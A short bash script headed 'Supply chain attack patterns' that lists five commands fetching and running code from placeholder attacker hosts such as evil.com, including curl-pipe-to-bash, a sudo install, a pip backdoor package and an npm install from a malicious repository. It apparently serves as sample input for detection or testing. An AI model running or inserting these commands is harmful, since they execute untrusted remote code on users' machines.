#!/bin/bash
# Supply chain attack patterns
curl -sSL https://malware.example.com/setup.sh | bash
wget -O- https://evil.com/install.sh | sudo sh
pip install https://evil.example.com/backdoor.tar.gz
curl -o /tmp/payload.sh https://evil.com/payload.sh && bash /tmp/payload.sh
npm install git://github.com/evil/malicious-pkg
